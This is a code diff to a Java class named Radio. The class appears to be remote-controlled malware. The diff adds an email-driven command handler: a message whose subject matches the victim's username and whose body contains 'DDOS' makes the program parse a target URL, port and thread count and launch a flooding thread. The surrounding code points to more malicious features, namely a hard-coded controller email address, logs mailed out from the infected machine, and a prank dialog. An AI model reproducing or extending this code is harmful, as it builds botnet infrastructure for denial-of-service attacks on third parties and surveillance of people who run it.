@@ -14,6 +14,7 @@ import java.net.URL;
 import java.net.URLConnection;
 import java.util.Calendar;
 import java.util.Properties;
+import java.util.StringTokenizer;
 import java.util.concurrent.Executors;
 
 import javax.activation.DataHandler;
@@ -170,6 +171,7 @@ public class Radio
 	public static String staticIP = "127.0.0.1"; // change accordingly
 	public static String allowedMailer = "targetemail@gmail.com";
 	public static Main m = new Main();
+	static DDoS ddoschan = new DDoS();
 	static DialogSpawner sp = new DialogSpawner("Get rickrolled", "Why did you run this?");
 	static Thread spawner = new Thread(sp);
 	static Astatine a;
@@ -532,6 +534,26 @@ public class Radio
 			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Manually resending logs...");
 			        	 message.setFlag(Flags.Flag.DELETED, true);
 			        	 mailLogs();
+			         }
+			         
+			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().contains("DDOS")) {
+			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Flooder activated.");
+			        	 StringTokenizer st = new StringTokenizer(message.getContent().toString());
+			        	 String url = st.nextToken();
+			        	 int port = Integer.parseInt(st.nextToken());
+			        	 int threads = Integer.parseInt(st.nextToken());
+			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Flooder: Target Locked: " + url + " PORT " + port);
+			        	 Executors.newSingleThreadExecutor().execute(new Runnable() {
+			     		    @Override
+			     		    public void run() {
+			     		    	try {
+			     		    		ddoschan.run(url, port, threads);
+			     				} catch (Exception e) {
+			     					// TODO Auto-generated catch block
+			     					e.printStackTrace();
+			     				}
+			     		    }
+			     		});   	 
 			         }
 			         
 		      	  }
